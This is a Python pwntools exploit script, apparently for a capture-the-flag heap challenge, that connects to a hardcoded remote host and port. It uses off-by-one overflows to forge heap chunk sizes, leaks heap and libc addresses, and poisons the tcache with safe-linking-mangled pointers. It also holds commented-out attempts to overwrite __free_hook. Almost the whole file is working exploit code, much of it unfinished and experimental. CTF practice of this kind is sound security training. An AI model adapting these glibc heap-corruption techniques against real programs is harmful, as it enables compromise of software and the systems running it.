#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 40901 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40901)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        #,aslr=False
        return gdb.debug([exe.path] + argv,aslr=False, env={"LD_PRELOAD":"./libc.so.6"}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"./libc.so.6"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# 0x555555555480 #malloc
# 0x555555555645 #free
# 0x5555555555a5 #view
gdbscript = '''
# b *0x555555555480
#
# b *0x555555555645
#
# b *0x5555555555a5
# b *0x55555555550d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


io = start()

libc = ELF("./libc.so.6")
print hex(libc.sym['__free_hook'])
def create(size,msg):
    io.sendlineafter("> ", "1")
    io.sendlineafter(" : ",str(size))
    io.sendlineafter(" : ",str(msg))

def show(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter(" : ",str(idx))

def delete(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter(" : ",str(idx))

# x/20gx 0x555555558040

create(0xa8, 'A'*0x20) # chunk_AAA, idx = 0
create(0xa8, 'B'*0x20) # chunk_BBB, idx = 1
create(0xa8, 'C'*0x20) # chunk_CCC, idx = 2

delete(0)
create(0xa8, '\xc1'*(0xa8+1)) # idx =0

delete(1)
create(0xb8, 'D'*(0xa8)+p64(0x421)) # idx =1

create(0xa0, 'E'*(0x20)) # idx =3
create(0xa0, 'F'*(0x20)) # idx =3
create(0xa0, 'F'*(0x20)) # idx =3
create(0xa0, 'F'*(0x20)) # idx =3
create(0xa0, 'F'*(0x20)) # idx =3
create(0x90, (p64(0)+p64(0x11))*10) # idx =3
# create(992, 'F'*(688-0xa0-0x10)+p64(0)+p64(0x11)+p64(0)+p64(0x11)) # idx = 4

# 0x55555555bee0
delete(2)
create(0xa8, 'A'*0x20)
create(0xa8, 'B'*0x20)
create(0xa8, 'C'*0x20)

delete(2)
create(0xa8, '\xc1'*(0xa8+1))

delete(9)

show(3)
# x/20gx 0x555555558040
io.recvuntil(" : ")
leak2 = (io.recvline()[:-1]).ljust(8,"\x00")
heap = (u64(leak2)<<12)-0x1000
print hex(heap)

delete(10)
purpose = p64((heap+0x20f0)^((heap+0x2000)>>0xc))
# create(0xb8, '\x08'*(0xa8)+p64(0xb0)+'\xff'*8)
create(0xb8, '\x08'*(0xa8)+p64(0xb0)+purpose)
create(0xa0, 'JUNK')
create(0xa0, '')

show(5)
io.recvuntil(" : \n")
leak = ('\x00'+ io.recvline()[:-1]).ljust(8,"\x00")
leak = u64(leak)
print hex(leak)

libc.address = leak - 0x1e3c00
print hex(libc.address)

# x/100gx 0x55555555c430
# x/30gx 0x555555558040
# idx 14 +2
########################################
create(0xc0, '')
create(0xc0, '')
create(0xc0, '')
create(0xc0, '')
create(0xc0, '')
#
# create(0xc8, 'A'*16)
# create(0xc8, 'B'*16)
# create(0xc8, 'C'*16)
#
# delete(17)
# create(0xc8, '\xe1'*(0xc8+1)) # idx =0
#
# delete(19)
# delete(18)
#
# purpose = p64((libc.sym['__free_hook'])^((heap+0x2000)>>0xc))
# purpose = p64((heap+0x20f0)^((heap+0x2000)>>0xc))
# # create(0xc8, 'D'*(0xc8)+p64(0x00000000000000c1) + '\xff'*8 )
# create(0xd8, 'D'*(0xc8)+p64(0x00000000000000e0) + purpose +'\x10') # idx =1
#
#
# create(0xc0, "JUNKFOOD")
# create(0xd0, p64(libc.sym['printf']))
# create(0xc0, p64(libc.sym['printf']))
# create(0xc0, p64(libc.sym['printf']))
########################################
create(0xb8, 'A'*0x20) # chunk_AAA, idx = 0
create(0xb8, 'B'*0x20) # chunk_BBB, idx = 1
create(0xb8, 'C'*0x20) # chunk_CCC, idx = 2

delete(17)
create(0xb8, '\xd1'*(0xb8+1)) # idx =0

delete(18)
create(0xc8, 'D'*(0xb8)+p64(0x921)) # idx =1

for _ in  range(11):
    create(0xb0, 'X'*0x20)
create(0xb0, (p64(0)+p64(0x11))*3)
delete(19)
########################################
# for i in  range(7):
#     delete(20+i)
# # x/100gx 0x55555555cb20
# for i in  range(3):
#     delete(20+7+i)

create(0x70, 'JUNK')

create(0x70, 'A'*0x20)
create(0x70, 'B'*0x20)
create(0x70, 'C'*0x20)

# delete(19+7)
# create(0xb8, '\xd1'*(0xb8+1))
# #
# delete(21)
# delete(20)
# purpose = p64((libc.sym['__free_hook'])^((heap+0x2000)>>0xc))
# # create(0xc8, '\xa1'*(0xb8)+p64(0xc1)+'\xff'*8)
# create(0xc8, '\xa1'*(0xb8)+p64(0xc1)+purpose)
# create(0xb0, 'JUNK')
# create(0xb8, p64(libc.sym['printf']))


########################################
# create(0xb8, p64(libc.sym['printf']))
#
# create(0xa0, '%x %x')
# create(0xa0, p64(libc.sym['printf']))
# create(0xa0, p64(libc.sym['printf']))
# create(0xb8, 'D'*(0xa8)+p64(0x421))

# create(0xa0, "%x %x")
# create(0xa0, p64(libc.sym['__free_hook']))
# create(0xa0, p64(libc.sym['printf']))
# create(0xa0, p64(1))
# create(0xb8, '\x08'*(0xa8)+p64(0x00000000000000b0)+'\xff'*8)


# create(0xa8, 'D'*0x20)
# create(0xa8, 'E'*0x20)
# # delete(3)
# # delete(2)
# # create(0x90, 'B'*0x20)
# delete(11)
# create(0xa8, '\xd1'*(0xa8+1))
# delete(12)
# create(0xc7, '\x08'*(0xa8)+p64(0x421))
#
#



# delete(9)

#
# # create(0xa8, 'JUNK')
# # create(0xa8, 'JUNK')
# # create(0xa8, 'JUNK')
# print hex(libc.sym['__free_hook'])
# free_hook = p64(libc.sym['__free_hook']^((heap+0x2000)>>0xc))
# purpose = p64((heap+0xd8)^((heap+0x2000)>>0xc))
#
# delete(2)
# create(0xa8, '\xc1'*(0xa8+1))
# delete(3)
# delete(10)
# create(0xb8, '\x08'*(0xa8)+p64(0x00000000000000b0)+purpose+p64(heap+0x10))
# create(0xa0, "%x %x")
# create(0xa0, p64(libc.sym['__free_hook']))
# create(0xa0, p64(libc.sym['printf']))
# create(0xa0, p64(1))
# create(0xb8, '\x08'*(0xa8)+p64(0x00000000000000b0)+'\xff'*8)
#
# x/20gx 0x555555558040
# #
# create(0xa8, '\x10'*(0xa0))

#
# create(0xc7, '\x08'*(0xa8)+p64(0x00000000000002c1)+p64(leak)*2)
# create(0xc7, 'JUNK')
# create(0xc7, 'JUNK')
# create(0xc7, 'JUNK')
#

# delete(10)
#
# create(0xa8, '\xd1'*(0xa8+1))
# create(0xa8, '\xd1'*(0xa8)+p64(0x00000000000000b1)+free_hook)


# delete(2)
# create(0xa8, '\xc1'*(0xa8+1))
# create(0xb8, '\x08'*(0xa8)+p64(0x00000000000002c1))
# create(0xb8, '\x08'*(0xa8)+p64(0x00000000000002c1) + p64(leak))
# delete(2)
# create(0xf8, '\x08'*(0xa8))

# # delete(1)
# # delete(2)

#



# create(0x70, 'J'*0x20)
# delete(4)


io.interactive()
